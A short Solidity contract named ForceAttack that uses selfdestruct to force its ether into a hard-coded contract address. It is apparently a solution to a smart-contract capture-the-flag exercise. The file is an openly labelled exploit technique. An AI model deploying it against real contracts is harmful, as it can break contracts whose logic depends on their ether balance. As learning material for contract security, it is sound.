// SPDX-License-Identifier: MIT
pragma solidity 0.8.23;

contract ForceAttack {
    address forceAddress = 0xa35D4C04166e7EC736E6dAe48ec5A3f9A75ba86d;

    function forceContract() public {
        selfdestruct(payable(forceAddress));
    }

    receive() external payable {
        // permet de recevoir de l'ether
    }
}
